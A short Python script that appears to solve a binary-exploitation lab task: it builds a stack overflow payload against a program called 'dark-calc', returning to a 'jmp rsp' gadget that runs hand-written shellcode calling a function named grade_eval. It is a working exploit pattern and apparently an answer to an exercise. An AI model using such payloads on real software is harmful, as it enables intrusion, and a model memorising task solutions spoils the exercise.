#!/usr/bin/env python3
"""Task 2: execute stack-resident shellcode in attack/dark-calc."""

import struct
import sys


def qword(value: int) -> bytes:
    return struct.pack("<Q", value)


# Return to an existing `jmp rsp` gadget.  It pivots into the bytes following
# the overwritten return address, so this payload does not depend on the
# randomized absolute stack address.  The shellcode sets EDI=4, pushes both
# an exit path and grade_eval(), then returns into grade_eval().
shellcode = bytes.fromhex(
    "6a04"                  # push 4
    "5f"                    # pop rdi
    "6880194000"            # push exit@plt
    "68871a4000"            # push grade_eval
    "c3"                    # ret
)

payload = (
    b"A" * 16
    + b"B" * 8
    + qword(0x401E0B)       # jmp rsp
    + shellcode
    + b"\n"
)

sys.stdout.buffer.write(payload)
